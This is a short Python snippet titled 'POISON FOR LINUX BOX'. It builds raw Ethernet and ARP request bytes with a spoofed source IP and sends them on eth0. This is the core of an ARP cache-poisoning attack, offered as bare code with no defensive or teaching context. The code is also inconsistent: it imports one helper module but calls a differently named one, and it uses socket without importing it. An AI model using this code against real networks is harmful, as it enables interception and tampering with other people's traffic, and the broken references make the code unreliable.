import net_helper_ipv6

## POISON FOR LINUX BOX
def send_arp_req(destmac, srcip, destip):

  eth_hdr  =  mac_str_to_bin(destmac) #dest hw addr
  eth_hdr  += get_my_mac()            #src hw addr 
  eth_hdr  += "\x08\x06"              #ether msg type

  arpreq = "\x00\x01"  # hw type
  arpreq += "\x08\x00" # protocol type (ethernet)
  arpreq += "\x06"     # length of hw addr (6 bytes)
  arpreq += "\x04"     # length of the ip addr
  arpreq += "\x00\01"  # operation code 
  arpreq += get_my_mac() # src mac
  arpreq += socket.inet_aton(srcip)       # src ip
  arpreq += "\x00" * 6		          # dest mac
  arpreq += socket.inet_aton(destip)      # dest ip

  cno_net_helper_ipv6.rawsend(eth_hdr + arpreq, dev="eth0")
